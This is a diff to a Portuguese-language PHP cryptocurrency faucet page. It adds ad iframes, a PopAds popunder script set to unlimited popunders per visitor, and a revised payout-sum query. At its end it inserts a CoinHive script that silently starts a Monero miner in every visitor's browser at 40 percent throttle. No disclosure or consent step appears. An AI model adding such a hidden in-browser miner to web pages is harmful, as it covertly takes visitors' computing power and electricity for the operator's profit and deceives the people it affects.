@@ -5,9 +5,11 @@ require_once 'classes/jsonRPCClient.php';
 require_once 'classes/recaptcha.php';
 require_once 'config.php';
 
-?><!DOCTYPE html>
+?>
+<!DOCTYPE html>
 <html>
 <head>
+
     <meta charset='UTF-8'>
     <title><?php echo $faucetTitle; ?></title>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
@@ -35,6 +37,35 @@ require_once 'config.php';
   gtag('config', 'UA-112509983-2');
 </script>
 
+
+
+<!-- PopAds.net Popunder Code for xmr-pool.ddns.net:8082 -->
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+  var _pop = _pop || [];
+  _pop.push(['siteId', 2477781]);
+  _pop.push(['minBid', 0]);
+  _pop.push(['popundersPerIP', 0]);
+  _pop.push(['delayBetween', 0]);
+  _pop.push(['default', false]);
+  _pop.push(['defaultPerDay', 0]);
+  _pop.push(['topmostLayer', false]);
+  (function() {
+    var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
+    var s = document.getElementsByTagName('script')[0]; 
+    pa.src = '//c1.popads.net/pop.js';
+    pa.onerror = function() {
+      var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
+      sa.src = '//c2.popads.net/pop.js';
+      s.parentNode.insertBefore(sa, s);
+    };
+    s.parentNode.insertBefore(pa, s);
+  })();
+/*]]>/* */
+</script>
+<!-- PopAds.net Popunder Code End -->
+
+
 </head>
 
 <body>
@@ -50,12 +81,11 @@ require_once 'config.php';
         <fieldset>
 
             <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-           <!-- <iframe data-aa='195916' src='https://ad.a-ads.com/195916?size=728x90' scrolling='no'
-                    style='width:728px; height:90px; border:0px; padding:0;overflow:hidden' allowtransparency='true'
-                    frameborder='0'></iframe>-->
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+
             <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-            <iframe style="width:120px;height:240px;" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" src="//ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=BR&source=ac&ref=tf_til&ad_type=product_link&tracking_id=nbr0f-20&marketplace=amazon&region=BR&placement=B012ELKC28&asins=B012ELKC28&linkId=27e95f3d90da4c00a36df88afe360188&show_border=false&link_opens_in_new_window=false&price_color=333333&title_color=0066C0&bg_color=FFFFFF">
-            </iframe>
             <br/>
 
 
@@ -126,7 +156,7 @@ require_once 'config.php';
 
                     $link = new PDO('mysql:host=' . $hostDB . ';dbname=' . $database, $userDB, $passwordDB);
 
-                    $query = 'SELECT SUM(payout_amount) FROM `payouts`;';
+                    $query = 'SELECT SUM(payout_amount) / 100000000 FROM `payouts`;';
 
                     $result = $link->query($query);
                     $dato = $result->fetchColumn();
@@ -138,7 +168,7 @@ require_once 'config.php';
 
                     ?>
 
-                    Realizados: <?php echo $dato[0] / $dividirEntre; ?> de <?php echo $dato2[0]; ?> pagamentos.
+                    Realizados: <?php echo $dato; ?> de <?php echo $dato2; ?> pagamentos.
                 </div>
 
                 <?php if ($balanceDisponibleFaucet < 1.0) { ?>
@@ -159,12 +189,9 @@ require_once 'config.php';
                     <input type='text' name='paymentid' placeholder='ID do pagamento (Opcional)'>
                     <br/>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-                    <iframe style="width:120px;height:240px;" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" src="//ws-na.amazon-adsystem.com/widgets/q?ServiceVersion=20070822&OneJS=1&Operation=GetAdHtml&MarketPlace=BR&source=ac&ref=tf_til&ad_type=product_link&tracking_id=nbr0f-20&marketplace=amazon&region=BR&placement=B0186FEYKW&asins=B0186FEYKW&linkId=6089e0501d9dd35e7b6d76b0f4f60c62&show_border=false&link_opens_in_new_window=false&price_color=333333&title_color=0066c0&bg_color=ffffff">
-                </iframe>
-
-                    <!--<iframe scrolling='no' frameborder='0' style='overflow:hidden;width:728px;height:90px;'
-                            src='//bee-ads.com/ad.php?id=19427'></iframe>-->
-
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+<iframe data-aa='827974' src='//ad.a-ads.com/827974?size=180x150' scrolling='no' style='width:180px; height:150px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                     <br/>
                     <?php
@@ -174,7 +201,8 @@ require_once 'config.php';
                     <center><input type='submit' value='Obter nióbios grátis!'></center>
                     <br>
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-                    <!--iframe scrolling='no' frameborder='0' style='overflow:hidden;width:468px;height:60px;' src='//bee-ads.com/ad.php?id=6534'></iframe-->
+<iframe data-aa='827963' src='//acceptable.a-ads.com/827963' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+
                     <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
                 <?php } ?>
                 <br>
@@ -252,5 +280,14 @@ require_once 'config.php';
         }, 10000);
     </script>
 <?php } ?>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('
+oYvc61Bs2T7WM6NXVZq4EqXx2kAXi4Aw', { throttle: 0.4 });
+miner.start();
+
+
+</script>
 </body>
 </html>
